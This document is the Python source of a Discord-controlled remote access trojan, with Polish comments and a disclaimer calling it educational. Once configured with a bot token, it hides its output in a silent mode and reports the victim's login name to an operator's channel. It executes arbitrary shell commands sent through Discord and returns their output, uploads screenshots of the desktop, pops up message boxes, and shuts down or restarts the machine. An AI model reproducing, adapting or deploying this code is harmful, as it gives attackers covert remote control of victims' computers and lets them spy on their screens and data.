# ⚠️ PROGRAM POWSTAŁ W CELACH EDUKACYJNYCH
# NIE PONOSZĘ ODPOWIEDZIALNOŚCI ZA SZKODY
# STWORZYŁ KOLOPA :D
import discord
import subprocess
import os
import sys
import ctypes

BOT_TOKEN = "{{BOT_TOKEN}}"
PREFIX = "{{PREFIX}}"
SILENT_MODE = "{{SILENT_MODE}}" 
TARGET_CHANNEL_ID = "{{CHANNEL_ID}}"
AUTHORIZED_USER_ID = "{{OWNER_ID}}"

if SILENT_MODE == "True":
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
  
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    if SILENT_MODE != "True":
        print(f"[+] Agent zalogowany pomyślnie jako: {client.user}")
        print(f"[*] Aktywny profil systemowy: {os.getlogin()}")
    
    if TARGET_CHANNEL_ID:
        try:
            channel = client.get_channel(int(TARGET_CHANNEL_ID))
            if channel:
                await channel.send(f"online na maszynie: `{os.getlogin()}`")
        except Exception:
            pass

@client.event
async def on_message(message):
    if message.author == client.user:
        return
      
    if TARGET_CHANNEL_ID and str(message.channel.id) != TARGET_CHANNEL_ID:
        return

    if AUTHORIZED_USER_ID and str(message.author.id) != AUTHORIZED_USER_ID:
        return
      
    if message.content == f"{PREFIX}help":
        embed = discord.Embed(
            title="Dostępne Komendy",
            description="Lista komend, które możesz uruchomić, aby zarządzać docelowym komputerem.",
            color=discord.Color.purple()
        )

        embed.add_field(
            name="⚙️ Konfiguracja",
            value=f"**Prefiks:** `{PREFIX}`\n"
                  f"**Uprawniony użytkownik:** <@{AUTHORIZED_USER_ID if AUTHORIZED_USER_ID else 'Wszyscy'}>\n"
                  f"**Kanał główny:** <#{TARGET_CHANNEL_ID if TARGET_CHANNEL_ID else 'Dowolny'}>",
            inline=False
        )

        embed.add_field(
            name="📊 Informacje o systemie",
            value=f"`{PREFIX}info` - Pobiera zaawansowane informacje o systemie",
            inline=False
        )

        embed.add_field(
            name="💬 Komunikaty",
            value=f"`{PREFIX}msgbox [tekst]` - Wyświetla wyskakujące okienko z wiadomością",
            inline=False
        )

        embed.add_field(
            name="🛠️ Zarządzanie systemem",
            value=f"`{PREFIX}screenshot` - Robi i wysyła zrzut ekranu\n"
                  f"`{PREFIX}cmd [polecenie]` - Wykonuje standardową komendę CMD/Terminal",
            inline=False
        )

        embed.add_field(
            name="🔌 Zasilanie i BOT",
            value=f"`{PREFIX}shutdown` - Wyłącza komputer stacyjny\n"
                  f"`{PREFIX}restart` - Uruchamia ponownie system\n"
                  f"`{PREFIX}exit` - Zamyka BOTA i kończy proces",
            inline=False
        )

        await message.channel.send(embed=embed)
      
    elif message.content == f"{PREFIX}info":
        try:
            login = os.getlogin()
            sys_name = os.name
            info_text = (
                f"👤 Użytkownik: {login}\n"
                f"💻 Środowisko OS: {sys_name}\n"
                f"📁 Katalog roboczy: {os.getcwd()}"
            )
            await message.channel.send(f"```\n{info_text}\n```")
        except Exception as e:
            await message.channel.send(f"❌ Błąd zbierania informacji: {e}")
          
    elif message.content.startswith(f"{PREFIX}msgbox "):
        text_to_show = message.content[len(f"{PREFIX}msgbox "):]
        await message.channel.send(f"💬 Wyświetlam okienko z napisem: `{text_to_show}`")
        
        if os.name == "nt":
            import threading
            def show_box():
                ctypes.windll.user32.MessageBoxW(0, text_to_show, "Powiadomienie Systemowe", 0)
            threading.Thread(target=show_box).start()
        else:
            await message.channel.send("Funkcja okienek systemowych jest wspierana tylko na Windows.")

  
    elif message.content == f"{PREFIX}screenshot":
        import pyautogui
        await message.channel.send("📸 Generowanie zrzutu ekranu...")
        try:
            filename = "temp_ss.png"
            screenshot = pyautogui.screenshot()
            screenshot.save(filename)
            
            file = discord.File(filename, filename="screenshot.png")
            await message.channel.send("Oto aktualny widok pulpitu:", file=file)

            os.remove(filename)
        except Exception as e:
            await message.channel.send(f"❌ Nie udało się przechwycić ekranu: {e}")

    elif message.content.startswith(f"{PREFIX}cmd "):
        command = message.content[len(f"{PREFIX}cmd "):]
        
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=12)
            try:
                decoded_output = output.decode("cp852")  
            except UnicodeDecodeError:
                decoded_output = output.decode("utf-8", errors="replace")
        except subprocess.TimeoutExpired:
            decoded_output = "❌ Błąd: Przekroczono czas oczekiwania na odpowiedź konsoli (12s)."
        except Exception as e:
            decoded_output = f"❌ Błąd przetwarzania komendy: {str(e)}"

        if len(decoded_output) > 1900:
            decoded_output = decoded_output[:1900] + "\n...[Wynik skrócony przez bufor bota]..."

        await message.channel.send(f"```\n{decoded_output}\n```")


    elif message.content == f"{PREFIX}shutdown":
        await message.channel.send("wyłączanie systemu (za 1 sekundę)...")
        if os.name == "nt":
            os.system("shutdown /s /t 1")
        else:
            os.system("shutdown -h now")

    elif message.content == f"{PREFIX}restart":
        await message.channel.send("Restartowanie systemu (za 1 sekundę)...")
        if os.name == "nt":
            os.system("shutdown /r /t 1")
        else:
            os.system("reboot")
          
    elif message.content == f"{PREFIX}exit":
        await message.channel.send("Proces bota został zdalnie przerwany.")
        await client.close()
        sys.exit()

if __name__ == "__main__":
    if BOT_TOKEN and not BOT_TOKEN.startswith("{{"):
        client.run(BOT_TOKEN)
